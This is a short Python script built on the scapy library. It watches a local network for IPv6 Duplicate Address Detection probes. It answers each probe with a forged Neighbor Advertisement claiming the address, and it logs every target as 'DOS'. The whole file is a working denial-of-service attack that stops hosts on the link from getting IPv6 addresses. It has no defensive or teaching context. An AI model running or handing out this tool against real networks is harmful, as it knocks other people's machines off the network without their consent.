#!/usr/bin/env python3

# Assert: interface set promisc mode on.
# Or specific maddr joined manually.

import scapy.all as sp
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', default=sp.conf.iface.name)
args = parser.parse_args()

interface = args.interface

filterstr = 'icmp6[icmp6type]==icmp6-neighborsolicit and ip6 src ::'

def prn(pkt):
    tgt = pkt[sp.ICMPv6ND_NS].tgt
    p = sp.Ether() / \
        sp.IPv6(src=tgt, dst='ff02::1') / \
        sp.ICMPv6ND_NA(tgt=tgt) / \
        sp.ICMPv6NDOptDstLLAddr(lladdr=sp.get_if_hwaddr(interface))
    sp.sendp(p, iface=interface)
    return f'DOS {tgt}'

sp.sniff(iface=interface, filter=filterstr, prn=prn)
